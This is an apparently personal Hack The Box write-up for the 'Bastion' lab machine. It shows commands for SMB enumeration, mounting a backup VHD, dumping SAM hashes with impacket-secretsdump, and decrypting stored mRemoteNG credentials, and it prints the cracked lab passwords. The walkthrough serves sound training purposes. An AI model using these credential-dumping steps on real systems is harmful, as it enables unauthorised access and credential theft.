<img src="Pasted image 20240722181815.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240706140426.png]]

**Nmap Scans**
```
mapit 10.10.10.134
```

Nmap Default Scan
![[Pasted image 20240706140550.png]]

Nmap Service and Script Scan
![[Pasted image 20240706140631.png]]
![[Pasted image 20240706140648.png]]

Nmap All Port Scan
![[Pasted image 20240706140822.png]]
Found some New Ports

Nmap Script and Service scan for new port found


Smb Enumeration
```
smbclient -U '' -L \\\\10.10.10.134\\\\
```
![[Pasted image 20240706140752.png]]

Will Enumerate the Share
```
smbclient //10.10.10.134/Backups -N
```
![[Pasted image 20240706141305.png]]
This looks like a windows Image backup, so we might get NTLM hashes from SAM and SYTEM file
Will mount this instead downloading

I have already created two directory one is smb and another vhd for mounting purpose in /mnt
```
mount -t cifs //10.10.10.134/backups /mnt/smb -o user=,password=
```
![[Pasted image 20240708125411.png]]

We can see Windows Image backup in our mounted dir, will enumerate further
![[Pasted image 20240708125648.png]]
We can see two .vhd files, which is Virtual Hard Disk files, will mount this get in another dir vhd

```
guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```
![[Pasted image 20240708125836.png]]
In Second .vhd file there are many folders including windows, will try to get SAM and SYSTEM




Will Jump to Initial Foothold.....!


Found Sam and System, will dump NTLM hashes using impacket-secretsdump
```
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```
![[Pasted image 20240708130100.png]]

Will crack this using crack station first https://crackstation.net/
![[Pasted image 20240708130219.png]]
Got the password its **L4mpje:bureaulampje**

Will get a session using ssh
```
ssh L4mpje@10.10.10.134
```
![[Pasted image 20240708130358.png]]
Got it...!

**user.txt**
![[Pasted image 20240708130518.png]]



Will Jump to Privilege Escalation.....!

Will Check our Privileges
```
whoami /priv
```
![[Pasted image 20240708130805.png]]

We can't get systeminfo
![[Pasted image 20240708130833.png]]

User info 
![[Pasted image 20240708131107.png]]

I can see the mRemoteNG in Program files x86
![[Pasted image 20240708132517.png]]
After some research about this program, I cam top know that this will save the password in encrypted format, the location of the xml file the password is C:\\Users\\l4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml
![[Pasted image 20240708132747.png]]

Will decrypt thus using a python script https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py
![[Pasted image 20240708133117.png]]

Will use -s option for the encrypted password string
```
python3 /root/Programs/mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```
![[Pasted image 20240708133230.png]]
Found the admin password **thXLHM96BeKL0ER2**

Will get as session as admin via ssh
```
ssh administrator@10.10.10.134
```
![[Pasted image 20240708133828.png]]

**Root.txt**
![[Pasted image 20240708133905.png]]



Done with Bastion.....:)